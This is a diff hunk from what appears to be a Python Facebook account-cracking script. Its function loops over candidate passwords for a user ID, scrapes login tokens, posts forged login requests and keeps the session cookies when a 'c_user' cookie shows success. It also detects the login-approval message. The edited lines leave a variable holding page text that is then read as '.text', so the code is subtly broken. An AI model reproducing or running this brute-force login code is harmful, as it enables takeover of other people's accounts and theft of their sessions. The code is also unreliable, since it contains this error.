@@ -1730,7 +1730,7 @@ def freeq(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            requu1 = Session.get('https://touch.facebook.com').text
             data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
             headers = {
             'authority': 'limited.facebook.com',
@@ -1753,7 +1753,7 @@ def freeq(uid,pwx,tl):
             'x-response-format': 'JSONStream',}  
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D125013557575103%26cbt%3D1711370324839%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbaaf6f7fe194608f%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%26client_id%3D125013557575103%26display%3Dpopup%26domain%3Dipiccy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fipiccy.com%252F%26locale%3Den_US%26logger_id%3Dfbaf3acf33bf3433c%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd35ec894a7163aa6%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%2526frame%253Df0e602a254491d629%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dun&lwv=100'
-            po = Session.post(url, headers=headers, data=data, allow_redirects=False).text
+            po = Session.post(url,data=data,headers=headers,allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
